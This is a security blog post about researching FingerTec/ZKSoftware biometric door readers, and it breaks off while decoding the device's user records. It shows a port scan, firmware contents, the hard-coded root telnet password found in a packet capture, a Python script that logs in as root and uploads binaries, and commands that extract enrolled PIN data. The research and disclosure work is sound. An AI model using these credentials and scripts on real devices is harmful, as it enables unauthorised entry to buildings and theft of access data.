<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>Digital Panther Security</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script src="https://digital-panther.com/js/jquery.min.js"></script>
  <script src="https://digital-panther.com/js/bootstrap.min.js"></script>
  
  <script src="https://digital-panther.com/js/toc.js"></script>
  <link href="https://digital-panther.com/css/bootstrap.min.css" rel="stylesheet">
  <link href="https://digital-panther.com/css/theme.css" rel="stylesheet">
  <link href="https://digital-panther.com/css/syntax.css" rel="stylesheet">
  <link href="https://digital-panther.com/css/font-awesome/css/font-awesome.min.css" rel="stylesheet">
</head>

<body>

  
<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-72130211-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>


  


 <script type="text/javascript">
  WebFontConfig = {
    google: {
      families: ['Ubuntu::latin']
    }
  };
  (function() {
    var wf = document.createElement('script');
    wf.src = ('https:' == document.location.protocol ? 'https' : 'http') +
      '://ajax.googleapis.com/ajax/libs/webfont/1/webfont.js';
    wf.type = 'text/javascript';
    wf.async = 'true';
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(wf, s);
  })();
</script>

  <nav class="navbar navbar-inverse navbar-fixed-top">
    <div class="container">
      <div class="navbar-header">
        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </button>
        <a class="navbar-brand" href="https://digital-panther.com/"><img src="/css/pics/logo.png"/></a>
      </div>
      <div class="collapse navbar-collapse">
        <ul class="nav navbar-nav">
          <li><a href="https://digital-panther.com/">home</a></li>
          <li><a href="https://digital-panther.com/archive.html">archive</a></li>
          <li><a href="https://digital-panther.com/tags.html">tags</a></li>
          <li><a href="https://digital-panther.com/about.html">about</a></li>
        </ul>
      </div>
    </div>
  </nav>


<div class="wrapper">
  <div class="content">
    <div class="container container-center">
      <div class="row">
        <div class="col-md-8">
          <div class="article">
            <div class="well">
              <h1><a href="https://digital-panther.com/2016/01/fingertec-rce">FingerTec Biometric Access Control Devices - Remote Code Exec and Remote Enrollment</a></h1>
              <div class="post-meta">
                <div class="post-time">
                  <i class="fa fa-calendar"></i>
                  <time>01 Jan 2016</time>
                </div>
                <ul>
                  
                    <li><a href="https://digital-panther.com/tag/fingertec">fingertec</a></li>
                  
                    <li><a href="https://digital-panther.com/tag/rce">rce</a></li>
                  
                    <li><a href="https://digital-panther.com/tag/telnet">telnet</a></li>
                  
                    <li><a href="https://digital-panther.com/tag/wireshark">wireshark</a></li>
                  
                </ul>
              </div>
              
              <div class="post-content">
              
              <img src="/images/fingertec-post.jpg"/>
              
                <div id="toc" class="toc"></div>
                <h2 id="overview">Overview</h2>

<p>In a company I worked for years ago, we moved from card swipe to biometric readers for access control.  It was more convenient for the office staff, and people didn’t lose their fingers nearly as often as cards.  The first ones we got were BioScrypt V-Flex readers, by KanTech.  They were expensive, wired into this serial port muxing mess, and shorted out if you had any static on you.</p>

<p><img src="/images/Bioscrypt_V-flex.jpg" alt="BioScrypt Readers" /></p>

<p>A few years ago we found FingerTec devices.  They had much better fingerprint detection, were static proof, and most importantly, used TCP/IP.  This meant that we could easily manage dozens of devices over several offices geographically.  They also accept RFID and/or pin codes, and any combination thereof.  We started off with the AC900s and moved up to the R2s.</p>

<p><img src="/images/fingertec.jpg" alt="FingerTec R2" /></p>

<p>I’ve been wanting to play with these in a bit more detail, and a couple of months ago I got some free time to work on it.</p>

<h2 id="initial-analysis">Initial analysis</h2>

<p>First thing I did was run a port scan on the device.  I’m doing this on a spare AC900 that we have.</p>

<pre><code>$ nmap 10.117.43.12 -A -p0-65535

Starting Nmap 7.00 ( https://nmap.org ) at 2015-12-16 15:54 EST
Nmap scan report for 10.117.43.12
Host is up (0.057s latency).
Not shown: 65533 closed ports
PORT     STATE    SERVICE VERSION
0/tcp    filtered unknown
23/tcp   open     telnet  ZKSoftware ZEM500 fingerprint reader telnetd (Linux 2.4.20; MIPS)
4368/tcp open     unknown
Service Info: OS: Linux; Device: security-misc; CPE: cpe:/o:linux:linux_kernel:2.4.20

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 163.61 seconds
</code></pre>

<p>Ok, so it is running telnet.</p>

<pre><code>$ telnet 10.117.43.12
Trying 10.117.43.12...
Connected to 10.117.43.12.
Escape character is '^]'.

Welcome to Linux (ZEM500) for MIPS
Kernel 2.4.20 Treckle on an MIPS
ZEM500 login: 
</code></pre>

<h2 id="attack">Attack</h2>

<p>A quick google search turns up some interesting information from other people:</p>

<p><a href="http://kishfellow.blogspot.com/2013/11/website-www.html">kishfellow.blogspot.com</a></p>

<p>and</p>

<p><a href="http://blog.infobytesec.com/2014/07/perverting-embedded-devices-zksoftware_2920.html">blog.infobytesec.com</a></p>

<p>It seems the base device is made by ZKSoftware, and FingerTec resells/customizes it.  There is no web server running, so I can’t try out any of those vulnerabilities.  All I have is telnet, and the software’s own protocol.</p>

<p>My goal: Get the root password.  I’d be willing to bet money at this point it is a hard coded password.</p>

<p>I also happen to have a firmware update.  Maybe I’d get lucky and the firmware is just an ext3 image.</p>

<pre><code>$ unzip ~/Downloads/AC900_565.zip 
Archive:  /home/danny/Downloads/AC900_565.zip
  inflating: FTUpdate.exe            
  inflating: main.tgz                
  inflating: Readme.txt  
</code></pre>

<p>Ok, so it uses a windows application to do the updating.  Contents of Readme.txt:</p>

<pre><code>Please follow below steps to update:

1. Enter your reader IP and connect
2. Check the manu date (manufacturer date) display in the list after connect
3. If you reader manu date if before July 2008, please select "Customize Options", else just select "Default Options"
4. Click Udpdate and wait until 5 steps completed. 
5. Reader will restart after successful.



ps: 
1. If you selected "Default Options" and the update program stuck after "Connected", please select "Customize Options" and reupdate. 

2. If it's still stuck, please go to reader MENU -&gt; Options -&gt; Comm Opt -&gt; COMM Key, change to "1", restart reader and change it back to "0" and restart it again. After restart please select "Customize Options" and update again.

3. If you selected "Customize Options" and the update program stuck after "Connected", please select "Default Options" and reupdate.
</code></pre>

<p>Well, seems simple enough.  Time to extract main.tgz, which probably contains a disk image.</p>

<pre><code>$ tar zxfv main.tgz
auto.sh
LANGUAGE.E
libdlcl.so
main
</code></pre>

<p>Wait.. what the..</p>

<pre><code>$ file main
main: ELF 32-bit LSB executable, MIPS, MIPS-I version 1 (SYSV), dynamically linked, interpreter /lib/ld.so.1, for GNU/Linux 2.6.0, stripped
</code></pre>

<p>Ok, this appears to be just files, that are updated.  This obviously seems ripe for embedding malware and just uploading that as a firmware update can probably get me in.  How about that auto.sh</p>

<pre><code>#!/bin/sh
SRC=$USERDATAPATH
DEST=/mnt/mtdblock
DEST2=/mnt/mtdblock/drivers
DEST3=/mnt/mtdblock/data

ifconfig eth0 192.168.1.201 up

ALGOLIB=/mnt/mtdblock/lib/libzkfp.so.3.5.1
ALGOLIB=/mnt/mtdblock/lib/libzkfp.so.3.5.1
export FPSENSORLIB_PATH=/mnt/mtdblock/lib/fpsensor_lib
if [ -f  /mnt/mtdblock/lib/libfpsensor.so ]; then
ln -s /mnt/mtdblock/lib/libfpsensor.so /lib/libfpsensor.so -f
fi

ln -s $DEST/lib/libzkfp.so.3.5.1 /lib/libzkfp.so.3 -f
ln -s $DEST/lib/libzkfp.so.3.5.1 /lib/libzkfp.so -f
ln -s $DEST/lib/libzkfp.so.4.0.0 /lib/libzkfp.so.10 -f
ln -s $DEST/lib/libpthread.so /lib/libpthread.so.0 -f
ln -s $DEST/lib/libfpsensor.so /lib/libfpsensor.so -f
ln -s $DEST/lib/libdlcl.so.1 /lib/libdlcl.so -f
ln -s $DEST/lib/libstdc++.so.6.0.8 /lib/libstdc++.so.6 -f
ln -s $DEST/lib/libgcc_s.so.1 /lib/libgcc_s.so.1 -f
ln -s $DEST/lib/libttf.so /lib/libttf.so -f
ln -s $DEST/lib/libhttppush.so /lib/libhttppush.so -f
ln -s /mnt/mtdblock/libdlcl.so /lib/libdlcl.so -f

mknod /dev/video0 c 81 0
mknod /dev/uba  b 180 0 
mknod /dev/uba1 b 180 1
mknod /dev/uba2 b 180 2
mknod /dev/ubb  b 180 8
mknod /dev/ubb1 b 180 9
mknod /dev/ubb2 b 180 10
mknod /dev/ubc  b 180 16
mknod /dev/ubc1 b 180 17
mknod /dev/ubc2 b 180 18
mknod /dev/ubd  b 180 24
mknod /dev/ubd1 b 180 25
mknod /dev/ubd2 b 180 26
mknod /dev/ube  b 180 32
mknod /dev/ube1 b 180 33
mknod /dev/ube2 b 180 34
mknod /dev/ubf  b 180 40
mknod /dev/ubf1 b 180 41
mknod /dev/ubf2 b 180 42
mknod /dev/ubg  b 180 48
mknod /dev/ubg1 b 180 49
mknod /dev/ubg2 b 180 50
mount  -t usbfs none /proc/bus/usb

if [ -f  /mnt/mtdblock/drivers/gspca.ko ]; then
        insmod /mnt/mtdblock/drivers/gspca.ko
fi
if [ -f  /mnt/mtdblock/lib/libfpsensor.so ]; then
ln -s /mnt/mtdblock/lib/libfpsensor.so /lib/libfpsensor.so -f
fi
if [ -f  /mnt/mtdblock/lib/libjpeg.so ]; then
ln -s /mnt/mtdblock/lib/libjpeg.so /lib/libjpeg.so.62 -f
fi
if [ -f $DEST/lib/libzkfp.so.4.0.0 ]; then
    cd $DEST/lib &amp;&amp; gunzip libzkfp.so.4.0.0 -f  &amp;&amp; sync
fi

if [ -f $DEST/libwebserver.tgz ]; then
  cd /lib &amp;&amp; tar -zxvf $DEST/libwebserver.tgz
fi

if [ -f /mnt/mtdblock/libwebserver_a.so ]; then
        ln -s /mnt/mtdblock/libwebserver_a.so /lib/libweb.so -f
fi

if [ -d $DEST/data/ ]; then
    if [ -f $DEST3/extlog.dat ]; then
        echo "extlog in /mnt/mtdblock/data"
    else
        if [ -f $DEST/extlog.dat ]; then
            mv $DEST/extlog.dat $DEST/data/ &amp;&amp; cd $DEST &amp;&amp; rm $DEST/extlog.dat &amp;&amp; sync
        fi
    fi
fi

if [ -d $DEST/data/ ]; then
    if [ -f $DEST3/transaction.dat ]; then
        echo "transaction in /mnt/mtdblock/data"
    else
        if [ -f $DEST/transaction.dat ]; then
            mv $DEST/transaction.dat $DEST/data/ &amp;&amp; cd $DEST &amp;&amp; rm $DEST/transaction.dat &amp;&amp; sync
        fi
    fi
fi
                                                
if [ -f $DEST/mainwav ]; then
        cd $DEST &amp;&amp; chmod u+x $DEST/mainwav &amp;&amp; $DEST/mainwav
fi

if [ -f $DEST/playwav ]; then
     cd $DEST &amp;&amp; chmod u+x $DEST/playwav &amp;&amp; $DEST/playwav E_0.wav;
fi

if [ -f $DEST/drivers/hv7131.ko ]; then
     insmod $DEST/drivers/hv7131.ko
fi

if [ -f $DEST2/cim.ko ]; then
        insmod $DEST2/cim.ko 
fi

if [ -f $DEST2/dummy.ko ]; then
        insmod $DEST2/dummy.ko 
fi

if [ ! -c /dev/ttygs ]; then
  mknod /dev/ttygs c 127 0
fi

if [ -f $DEST2/nand_drv.ko ]; then
        insmod $DEST2/nand_drv.ko 
fi

if [ -f $DEST2/jz4730_udc.ko ]; then
        insmod $DEST2/jz4730_udc.ko
fi

if [ -f $DEST2/g_serial.ko ]; then
        insmod $DEST2/g_serial.ko use_acm=1
fi

if [ -f /mnt/mtdblock/rt73.ko ]; then
        cd /mnt/mtdblock/drivers &amp;&amp; rm jz4730_udc.ko g_serial.ko -f &amp;&amp; sync
fi

if [ -f /mnt/mtdblock/rt73.ko ]; then
        insmod /mnt/mtdblock/rt73.ko
fi

rm -rf /etc/rt73sta.dat

if [ -f $DEST/usbpower.zem500 ]; then
  chmod u+x $DEST/usbpower.zem500 &amp;&amp; $DEST/usbpower.zem500
fi

if [ -f $DEST/main.gz ]; then
  cd $DEST &amp;&amp; rm main -f &amp;&amp; gunzip main.gz &amp;&amp; sync
fi

if [ -f $DEST/main ]; then
   chmod u+x $DEST/main &amp;&amp; cd $DEST &amp;&amp; $DEST/main&amp;
fi

if [ -f $DEST/inbiocomm ];then
  chmod u+x $DEST/inbiocomm &amp;&amp; cd $DEST &amp;&amp; $DEST/inbiocomm&amp;
fi
  
if [ -f $DEST/data/wdt_new ]; then
  cd $DEST/data &amp;&amp; chmod u+x $DEST/data/wdt_new &amp;&amp; $DEST/data/wdt_new -p 5 -t 3600 -m "$DEST/main" -n "$DEST/inbiocomm"
fi
</code></pre>

<p>Well, that looks like a startup script if I’ve ever seen one.  Now I’m going to try and run the firmware update cleanly, and just capture what happens.</p>

<p><img src="/images/fingertec_update.png" alt="FingerTec Update success" /></p>

<p>Well, it looks like the update went through fine.  Next I scrolled through the packet capture.</p>

<p><img src="/images/fingertec_packet1.png" alt="FingerTec Packet Capture 1" /></p>

<p>It looks like it tries to connect via TCP a couple of times, fails, and then connects via UDP.  This is what gives the initial version and device info before you hit ‘update’.  Scrolling it bit farther down you find…</p>

<p><img src="/images/fingertec_packet2.png" alt="FingerTec Packet Capture 2" /></p>

<p><em>TELNET!?!?!</em>   Why would the update process be communicating over telnet?</p>

<p><img src="/images/fingertec_packet3.png" alt="FingerTec Packet Capture 3" /></p>

<p>Well, as we can see here, the update software starts a tftp server, telnets in as root, and tells the device to tftp the update from the fingerprint reader.  Then it extracts it over the flash storage.  It actually failed to get the file since the TFTP server doesn’t seem to know anything about disabling firewalls.</p>

<h2 id="exploitation">Exploitation</h2>

<p>Now that we have the root password, let’s see what we can do on this device</p>

<pre><code>Welcome to Linux (ZEM500) for MIPS
Kernel 2.4.20 Treckle on an MIPS
ZEM500 login: root
Password: 


BusyBox v1.1.3 (2007.10.09-20:41+0000) Built-in shell (ash)
Enter 'help' for a list of built-in commands.

# busybox
BusyBox v1.1.3 (2007.10.09-20:41+0000) multi-call binary

Usage: busybox [function] [arguments]...
   or: [function] [arguments]...

        BusyBox is a multi-call binary that combines many common Unix
        utilities into a single executable.  Most people will create a
        link to busybox for each function they wish to use and BusyBox
        will act like whatever it was invoked as!

Currently defined functions:
        [, [[, ash, bunzip2, busybox, bzcat, cat, chmod, cp, date, df,
        dmesg, du, echo, env, free, ftpget, ftpput, getty, gunzip, gzip,
        halt, hostname, ifconfig, inetd, init, insmod, kill, killall,
        ln, login, ls, lsmod, mkdir, mknod, mount, mv, passwd, ping, poweroff,
        ps, pwd, rdate, reboot, rm, rmdir, rmmod, route, sh, sync, tar,
        telnetd, test, tftp, traceroute, tty, umount, uptime, vi, wget,
        zcat

# 
</code></pre>

<p>It seems we have a pretty limited busybox shell.  We do have ftpput and ftpget though, and we can use those to transfer files.  I didn’t really feel like getting an FTP server set up for this though, so instead wrote a script to use echo to upload a more recent version of busybox.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/env python</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">telnetlib</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">pdb</span>
<span class="kn">import</span> <span class="nn">base64</span>


<span class="k">class</span> <span class="nc">RemoteServer</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">server</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span><span class="n">port</span><span class="o">=</span><span class="mi">23</span><span class="p">,</span><span class="n">username</span><span class="o">=</span><span class="n">b</span><span class="s">&#39;root&#39;</span><span class="p">,</span><span class="n">password</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span><span class="n">color</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">server</span><span class="p">:</span>
            <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">server</span><span class="p">)</span> <span class="ow">is</span> <span class="nb">str</span><span class="p">:</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">server</span> <span class="o">=</span> <span class="n">server</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">server</span> <span class="o">=</span> <span class="n">server</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">port</span> <span class="o">=</span> <span class="n">port</span>
        <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">username</span><span class="p">)</span> <span class="ow">is</span> <span class="nb">str</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">username</span> <span class="o">=</span> <span class="n">username</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">username</span> <span class="o">=</span> <span class="n">username</span>

        <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">password</span><span class="p">)</span> <span class="ow">is</span> <span class="nb">str</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">password</span> <span class="o">=</span> <span class="n">password</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">password</span> <span class="o">=</span> <span class="n">password</span>

        <span class="k">if</span> <span class="n">color</span><span class="p">:</span>
            <span class="kn">import</span> <span class="nn">colorama</span>
            <span class="n">colorama</span><span class="o">.</span><span class="n">init</span><span class="p">()</span>


    <span class="k">def</span> <span class="nf">connect</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">tn</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">server</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">tn</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="n">b</span><span class="s">&quot;login: &quot;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">tn</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">username</span> <span class="o">+</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">tn</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="n">b</span><span class="s">&quot;Password: &quot;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">tn</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">password</span> <span class="o">+</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">tn</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="n">b</span><span class="s">&quot;# &quot;</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">run_cmd</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="n">b</span><span class="s">&quot;# &quot;</span><span class="p">):</span>
        <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span> <span class="ow">is</span> <span class="nb">str</span><span class="p">:</span>
            <span class="n">cmd</span> <span class="o">=</span> <span class="n">cmd</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">tn</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">cmd</span> <span class="o">+</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
        <span class="n">res</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">tn</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="n">b</span><span class="s">&#39;# &#39;</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">res</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span><span class="o">+</span><span class="mi">2</span><span class="p">:]</span>

    <span class="k">def</span> <span class="nf">upload_file</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">filename</span><span class="p">):</span>
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
                <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
                <span class="k">if</span> <span class="ow">not</span> <span class="n">data</span><span class="p">:</span>
                    <span class="k">break</span>
                <span class="n">line</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">b</span><span class="s">&#39;</span><span class="se">\\\\</span><span class="s">x&#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">a</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">data</span><span class="p">])</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">run_cmd</span><span class="p">(</span><span class="n">b</span><span class="s">&#39;echo -n -e &#39;</span> <span class="o">+</span> <span class="n">line</span> <span class="o">+</span> <span class="n">b</span><span class="s">&#39; &gt;&gt; &#39;</span> <span class="o">+</span> <span class="n">filename</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
        <span class="k">return</span> <span class="bp">True</span>

    
<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">server</span><span class="o">=</span><span class="s">&#39;10.117.43.12&#39;</span>
    <span class="k">print</span><span class="p">(</span><span class="s">&quot;Connecting to </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">server</span><span class="p">)</span>
    <span class="n">t</span> <span class="o">=</span> <span class="n">RemoteServer</span><span class="p">(</span><span class="n">server</span><span class="o">=</span><span class="n">server</span><span class="p">,</span> <span class="n">username</span><span class="o">=</span><span class="s">&#39;root&#39;</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s">&#39;founder88&#39;</span><span class="p">)</span>
    <span class="n">t</span><span class="o">.</span><span class="n">connect</span><span class="p">()</span>
    <span class="k">print</span><span class="p">(</span><span class="s">&quot;Checking for busybox-mipsel binary&quot;</span><span class="p">)</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">t</span><span class="o">.</span><span class="n">run_cmd</span><span class="p">(</span><span class="s">&#39;ls /root/busybox-mipsel&#39;</span><span class="p">)</span>
    
    <span class="k">if</span> <span class="n">b</span><span class="s">&#39;No such file or directory&#39;</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">&quot;Busybox binary not found.  Uploading new binary (This may take a little while, be patient)&quot;</span><span class="p">)</span>
        <span class="n">t</span><span class="o">.</span><span class="n">upload_file</span><span class="p">(</span><span class="s">&#39;busybox-mipsel.gz&#39;</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="s">&quot;Upload complete - extracting&quot;</span><span class="p">)</span>
        <span class="n">t</span><span class="o">.</span><span class="n">run_cmd</span><span class="p">(</span><span class="s">&#39;gunzip busybox-mipsel.gz&#39;</span><span class="p">)</span>
        <span class="n">t</span><span class="o">.</span><span class="n">run_cmd</span><span class="p">(</span><span class="s">&#39;chmod +x busybox-mipsel&#39;</span><span class="p">)</span></code></pre></figure>

<p>After running it, busybox is copied over.</p>

<pre><code># ./busybox-mipsel 
BusyBox v1.16.1 (2010-03-29 11:52:23 CDT) multi-call binary.
Copyright (C) 1998-2009 Erik Andersen, Rob Landley, Denys Vlasenko
and others. Licensed under GPLv2.
See source distribution for full notice.

Usage: busybox [function] [arguments]...
   or: function [arguments]...

        BusyBox is a multi-call binary that combines many common Unix
        utilities into a single executable.  Most people will create a
        link to busybox for each function they wish to use and BusyBox
        will act like whatever it was invoked as.

Currently defined functions:
        [, [[, acpid, addgroup, adduser, adjtimex, arp, arping, ash, awk,
        basename, bbconfig, beep, blkid, brctl, bunzip2, bzcat, bzip2, cal,
        cat, catv, chat, chattr, chgrp, chmod, chown, chpasswd, chpst, chroot,
        chrt, chvt, cksum, clear, cmp, comm, cp, cpio, crond, crontab, cryptpw,
        cttyhack, cut, date, dc, dd, deallocvt, delgroup, deluser, depmod,
        devmem, df, dhcprelay, diff, dirname, dmesg, dnsd, dnsdomainname,
        dos2unix, dpkg, dpkg-deb, du, dumpkmap, dumpleases, echo, ed, egrep,
        eject, env, envdir, envuidgid, ether-wake, expand, expr, fakeidentd,
        false, fbset, fbsplash, fdflush, fdformat, fdisk, fgrep, find, findfs,
        flashcp, fold, free, freeramdisk, fsck, fsck.minix, fsync, ftpd,
        ftpget, ftpput, fuser, getopt, getty, grep, gunzip, gzip, halt, hd,
        hdparm, head, hexdump, hostid, hostname, httpd, hush, hwclock, id,
        ifconfig, ifdown, ifenslave, ifplugd, ifup, inetd, init, insmod,
        install, ionice, ip, ipaddr, ipcalc, ipcrm, ipcs, iplink, iproute,
        iprule, iptunnel, kbd_mode, kill, killall, killall5, klogd, lash, last,
        length, less, linux32, linux64, linuxrc, ln, loadfont, loadkmap,
        logger, login, logname, logread, losetup, lpd, lpq, lpr, ls, lsattr,
        lsmod, lspci, lsusb, lzmacat, lzop, lzopcat, makedevs, makemime, man,
        md5sum, mdev, mesg, microcom, mkdir, mkdosfs, mkfifo, mkfs.minix,
        mkfs.reiser, mkfs.vfat, mknod, mkpasswd, mkswap, mktemp, modprobe,
        more, mount, mountpoint, msh, mt, mv, nameif, nc, netstat, nice,
        nmeter, nohup, nslookup, ntpd, od, openvt, passwd, pgrep, pidof, ping,
        ping6, pipe_progress, pivot_root, pkill, popmaildir, poweroff,
        printenv, printf, ps, pscan, pwd, raidautorun, rdate, rdev, readahead,
        readlink, readprofile, realpath, reboot, reformime, renice, reset,
        resize, rm, rmdir, rmmod, route, rpm, rpm2cpio, rtcwake, run-parts,
        runlevel, runsv, runsvdir, rx, script, scriptreplay, sed, sendmail,
        seq, setarch, setconsole, setfont, setkeycodes, setlogcons, setsid,
        setuidgid, sh, sha1sum, sha256sum, sha512sum, showkey, slattach, sleep,
        softlimit, sort, split, start-stop-daemon, stat, strings, stty, su,
        sulogin, sum, sv, svlogd, swapoff, swapon, switch_root, sync, sysctl,
        syslogd, tac, tail, tar, tcpsvd, tee, telnet, telnetd, test, tftp,
        tftpd, time, timeout, top, touch, tr, traceroute, traceroute6, true,
        tty, ttysize, tunctl, udhcpc, udhcpd, udpsvd, umount, uname,
        uncompress, unexpand, uniq, unix2dos, unlzma, unlzop, unzip, uptime,
        usleep, uudecode, uuencode, vconfig, vi, vlock, volname, wall, watch,
        watchdog, wc, wget, which, who, whoami, xargs, yes, zcat, zcip

# 
</code></pre>

<p>That is much better!  Since this device can enroll RFID cards, pin codes, and fingerprints, let’s see if we can find where they are stored.<br />
We’ll go right into /mnt/mtdblock, since that seems to be where the earlier firmware update wanted to extract to.</p>

<pre><code># ls
CmdScriptBW_2.sh    custvoice.dat       libfpsensor.so      sms.dat
ErrorCardEvent.dat  data                libhttppush.so      template.dat
LANGUAGE.E          dhcp.txt            libzkfp.so.3.5.1    udata.dat
OfflineEvent.dat    dump.txt            main                udhcpc
Script.sh           extuser.dat         mgetty              usbpower.zem500
auto.sh             font                oplog.dat           user.dat
beep.wav            htimezone.dat       options.cfg         wdt
custattstate.dat    libdlcl.so.1        passwd              workcode.dat
</code></pre>

<p>It looks like the files that were supposed to be contained in that main.tgz would be extracted directly to here.  The user.dat catches my eye first.  I have 2 users enrolled on the reader right now (an admin, and a normal user).</p>

<pre><code># /root/busybox-mipsel uuencode -m user.dat user
begin-base64 777 user
AQAGMTIzNAAAAAAAAAAAAAAAAAAAAQAAAQAAAAIAADY5NjkAAAAAAAAAAAAA
AAAAAAEAANAHAAA=
====
# 
</code></pre>

<p>Back on my local machine…</p>

<pre><code>echo 'AQAGMTIzNAAAAAAAAAAAAAAAAAAAAQAAAQAAAAIAADY5NjkAAAAAAAAAAAAAAAAAAAEAANAHAAA=' | base64 -d &gt; user.dat
</code></pre>

<p>We can see here that the file is 56 bytes long:</p>

<pre><code>[danny@localhost code]$ ls -al user.dat
-rw-r--r-- 1 danny users 56 Jan  6 17:09 user.dat
</code></pre>

<p>From this, we can assume that each record would be 28 bytes long.  Just to make things easier, we’ll dump it to hex like so:</p>

<pre><code>[danny@localhost code]$ hexdump -e '28/1 "%02x " "\n"' user.dat
01 00 06 31 32 33 34 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 01 00 00 00
02 00 00 36 39 36 39 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 d0 07 00 00
</code></pre>

<p>Looking at this, we can tell a few things right off the bat.  To make it easier, I’ve labeled the columns</p>

<pre><code> 1  2  3  4  5  6  7  8  9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28
-----------------------------------------------------------------------------------
01 00 06 31 32 33 34 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 01 00 00 00
